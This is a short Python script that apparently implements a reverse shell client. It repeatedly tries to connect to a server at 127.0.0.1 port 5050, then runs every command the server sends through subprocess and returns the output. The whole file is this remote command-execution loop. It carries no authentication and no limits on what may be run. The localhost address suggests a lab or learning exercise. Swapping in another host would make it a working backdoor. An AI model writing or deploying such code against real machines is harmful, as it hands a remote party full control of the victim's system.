import socket 
import subprocess
import time

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 5050
BUFFER_SIZE = 1024

def worker():
    # Try to connect
    s = socket.socket()
    while True:
        try:
            s.connect((SERVER_HOST, SERVER_PORT))
            print("Connected!")
            break
        except Exception as e:
            print("Connection Error: " + str(e))
            time.sleep(2)
            continue

    # Welcome message
    message = s.recv(BUFFER_SIZE).decode()
    print("Server:", message)

    # Get new commands
    while True:
        command = s.recv(BUFFER_SIZE).decode()
        if command.lower() == "exit":
            break

        output = subprocess.getoutput(command)
        s.send(output.encode())

    s.close()

if __name__ == '__main__':
    worker()